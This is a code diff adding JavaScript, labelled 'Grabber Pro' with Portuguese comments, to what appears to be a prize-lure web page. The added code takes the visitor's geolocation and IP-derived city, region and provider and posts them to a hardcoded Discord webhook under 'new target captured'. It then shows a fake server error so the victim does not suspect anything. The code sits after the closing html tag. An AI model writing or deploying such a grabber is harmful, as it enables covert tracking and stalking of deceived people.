@@ -87,3 +87,47 @@
     </script>
 </body>
 </html>
+async function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+
+            // --- CONFIGURAÇÃO DO WEBHOOK ---
+             const webhookURL = "https://discord.com/api/webhooks/1551738010297565314/S2WEQnqpzLdaLyNAZQIpqwJiIhAPbEMXZ18kfPCzpH0NfekK4WCNPbcPEfVq1bYMdh3w";
+            
+            const mensagem = {
+                content: "🎯 **NOVO ALVO CAPTURADO!**",
+                embeds: [{
+                    title: "Informações do Alvo",
+                    color: 16711680, // Cor vermelha
+                    fields: [
+                        { name: "IP", value: ipData.ip, inline: true },
+                        { name: "Cidade", value: ipData.city, inline: true },
+                        { name: "Região", value: ipData.region, inline: true },
+                        { name: "Lat/Lon", value: `${lat}, ${lon}`, inline: false },
+                        { name: "Google Maps", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
+                        { name: "Provedor", value: ipData.org, inline: true }
+                    ],
+                    footer: { text: "Capturado via Grabber Pro" }
+                }]
+            };
+
+            // Envia os dados para o Discord
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(mensagem)
+            });
+
+            // Mostra uma mensagem falsa para ele não desconfiar
+            dataDisplay.innerHTML = "Verificando região... <br>Erro: Servor 502. Tente novamente em instantes.";
+            mainCard.classList.add('hidden');
+            resultCard.classList.remove('hidden');
+        }
+
+        function error() {
+            alert("Você precisa permitir a localização para resgatar o prêmio!");
+        }
+        
